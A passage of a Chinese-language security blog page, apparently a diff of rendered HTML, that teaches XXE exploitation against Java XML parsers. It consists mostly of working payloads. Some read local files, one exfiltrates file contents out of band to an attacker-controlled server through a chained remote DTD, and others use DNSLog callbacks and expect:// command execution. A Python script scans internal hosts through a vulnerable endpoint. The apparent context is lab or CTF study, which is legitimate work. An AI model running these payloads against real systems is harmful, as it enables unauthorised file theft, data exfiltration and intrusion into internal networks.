+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ELEMENT foo EMPTY&gt;</span>
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>Mi1k7ea<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span>male<span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span>20<span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现可以正常解析。</p>
+<h4 id="3测试是否支持解析参数实体"><strong>3.测试是否支持解析参数实体</strong></h4>
+<p>修改xml内容如下，主要修改ELEMENT为<code>ENTITY</code>实体：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ENTITY foo &#34;Entity can be hacked&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>Mi1k7ea<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span><span class="ni">&amp;foo;</span><span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span>20<span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可正常解析，且成功进行了XML实体注入</p>
+<h4 id="4测试是否支持解析外部实体"><strong>4.测试是否支持解析外部实体：</strong></h4>
+<p>修改xml内容如下，主要修改为<code>SYSTEM</code>执行访问外部链接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo SYSTEM &#34;http://192.168.17.111:8000/1.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>Mi1k7ea<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span>male<span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span><span class="ni">&amp;tea;</span><span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要在攻击者的服务器的Web目录放置一个1.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY tea SYSTEM &#34;file:///c:/windows/win.ini&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件：</p>
+<p>发现成功通过远程加载解析DTD文件读取了本地文件内容：</p>
+<p><strong>外部实体还有另一种写法</strong>，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ENTITY % milk SYSTEM &#34;http://192.168.17.136:8000/Mi1k7ea.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">        %milk;
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>Mi1k7ea<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span>male<span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span><span class="ni">&amp;tea;</span><span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="有回显读取本地文件norm-xxe">有回显读取本地文件(Norm XXE)</h3>
+<p>Payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &#34;file:///tmp/flag.txt&#34;&gt;</span>]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;person&gt;&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;&lt;/person&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705205255954.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705205255954.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705205255954.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705205255954.png 2x"
+    data-sizes="auto"
+    alt="image-20240705205255954"
+    title="image-20240705205255954"/></p>
+<h3 id="使用-netdoc-的-xxe-攻击">使用 netdoc 的 XXE 攻击</h3>
+<p>主要将file://换成netdoc:/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE data [
+</span></span></span><span class="line"><span class="cl"><span class="cp">        &lt;!ELEMENT data (#PCDATA)&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="cp">&lt;!ENTITY file SYSTEM &#34;netdoc:/e:/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">        ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;name&gt;</span>netdoc<span class="nt">&lt;/name&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;sex&gt;</span>netdoc<span class="nt">&lt;/sex&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;age&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/age&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一些基本的绕过：https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#%E7%BB%95%E8%BF%87%E5%9F%BA%E6%9C%AC-XXE-%E6%94%BB%E5%87%BB%E7%9A%84%E9%99%90%E5%88%B6</p>
+<h3 id="oob-xxe">OOB XXE</h3>
+<p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法&mdash;&mdash;外带</p>
+<p>想要外带就必须能发起请求，<strong>那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候</strong>，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p>
+<p><strong>Java在Blind XXE的利用上</strong>，读取文件会有些问题，在PHP中，我们可以使用 <code>php://filter/read=convert.base64-encode/resource=/etc/hosts</code> 方法将文本内容进行base64编码。但是Java中没这样的编码方法，所以<strong>如果要读取换行的文件，一般使用FTP协议</strong>，HTTP协议会由于存在换行等字符，请求发送失败。</p>
+<p>1.在我们VPS创建一个<code>test.dtd</code>文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % file SYSTEM &#34;file:///tmp/flag.txt&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % int &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://192.168.3.214:7777?p=%file;&#39;&gt;&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.开始web服务，以便后续步骤可以访问到这个<code>test.dtd</code>文件，比如SimpleHTTPServer</p>
+<p>3.burp抓包修改数据包, 下面数据包一旦经受害者服务器处理，就会向我们的vps发送请求，查找我们的DTD文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!DOCTYPE convert [ 
+</span></span><span class="line"><span class="cl">&lt;!ENTITY % remote SYSTEM &#34;http://192.168.3.214:7777/test.dtd&#34;&gt;
+</span></span><span class="line"><span class="cl">%remote;%int;%send;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果我们vps收到了flag.txt的文件内容，而SimpleHTTPServer也收到了对test.dtd的GET请求</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705210921413.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705210921413.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705210921413.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705210921413.png 2x"
+    data-sizes="auto"
+    alt="image-20240705210921413"
+    title="image-20240705210921413"/></p>
+<p><strong>整个调用过程：</strong></p>
+<p>我们从 payload 中能看到 连续调用了三个参数实体 <code>%remote;%int;%send;</code>，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p><strong>思考：</strong></p>
+<p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，<strong>XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式</strong>，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
+<p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我<strong>们必须清楚地知道在何种平台，我们能用何种协议</strong>:</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211110521.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211110521.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211110521.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211110521.png 2x"
+    data-sizes="auto"
+    alt="image-20240705211110521"
+    title="image-20240705211110521"/></p>
+<h3 id="请求dnslog">请求DNSLog</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE root [
+</span></span></span><span class="line"><span class="cl"><span class="cp">  &lt;!ENTITY file SYSTEM &#34;https://dnslog地址&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;root&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/root&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211516466.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211516466.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211516466.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211516466.png 2x"
+    data-sizes="auto"
+    alt="image-20240705211516466"
+    title="image-20240705211516466"/></p>
+<h3 id="执行系统命令">执行系统命令</h3>
+<blockquote>
+<p>我们说的利用xxe命令执行，直接获取shell，都是在php中的xxe，PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，我们可以直接执行系统命令；这种情况少有发生，而且换到了java中，并没有直接能shell的操作</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY [
+</span></span></span><span class="line"><span class="cl"><span class="cp">		&lt;! ENTITY xxe SYSTEM &#34;expect://id&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;x&gt;</span><span class="err">&amp;</span>xxe<span class="nt">&lt;/x&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="探测内网">探测内网</h3>
+<p>可通过时间响应差异等情况探测内网IP，以及端口开放情况。</p>
+<p>如果内网存在redis未授权，可以尝试进行组合攻击。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE ANY[    
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY port SYSTEM &#34;http://127.0.0.1:80&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt; 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;x&gt;</span><span class="ni">&amp;port;</span><span class="nt">&lt;/x&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211613861.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211613861.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211613861.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211613861.png 2x"
+    data-sizes="auto"
+    alt="image-20240705211613861"
+    title="image-20240705211613861"/></p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211632680.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211632680.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211632680.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211632680.png 2x"
+    data-sizes="auto"
+    alt="image-20240705211632680"
+    title="image-20240705211632680"/></p>
+<p><strong>HTTP内网主机探测：</strong></p>
+<p>以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（以linux 为例），可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
+<p>脚本例子如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Origtional XML that the server accepts</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#&lt;xml&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    &lt;stuff&gt;user&lt;/stuff&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#&lt;/xml&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_xml</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="n">xml</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="n">xml</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;&lt;!ENTITY xxe SYSTEM &#34;&#34;&#34;</span> <span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span> <span class="o">+</span> <span class="n">string</span> <span class="o">+</span> <span class="s1">&#39;&#34;&#39;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;&gt;]&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="n">xml</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;&lt;xml&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="n">xml</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xml</span> <span class="o">=</span> <span class="n">xml</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;&#34;&lt;/xml&gt;&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_xml</span><span class="p">(</span><span class="n">xml</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_xml</span><span class="p">(</span><span class="n">xml</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/xml&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://34.200.157.128/CUSTOM/NEW_XEE.php&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">xml</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="n">coded_string</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="c1"># a little split to get only the base64 encoded value</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">coded_string</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   print base64.b64decode(coded_string)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">255</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;10.0.0.&#39;</span> <span class="o">+</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">        <span class="n">string</span> <span class="o">=</span> <span class="s1">&#39;php://filter/convert.base64-encode/resource=http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">string</span>
+</span></span><span class="line"><span class="cl">        <span class="n">build_xml</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="k">continue</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>HTTP 内网主机端口扫描：</strong></p>
+<p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的。</p>
+<p>比如传入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE data SYSTEM &#34;http://127.0.0.1:515/&#34; [  
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ELEMENT data (#PCDATA)&gt;</span>  
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;data&gt;</span>4<span class="nt">&lt;/data&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用burp进行端口遍历：</p>
+<p><img
+    class="lazyload"
+    src="/svg/loading.min.svg"
+    data-src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211945308.png"
+    data-srcset="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211945308.png, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211945308.png 1.5x, https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/typora/image-20240705211945308.png 2x"
+    data-sizes="auto"
+    alt="image-20240705211945308"
+    title="image-20240705211945308"/></p>
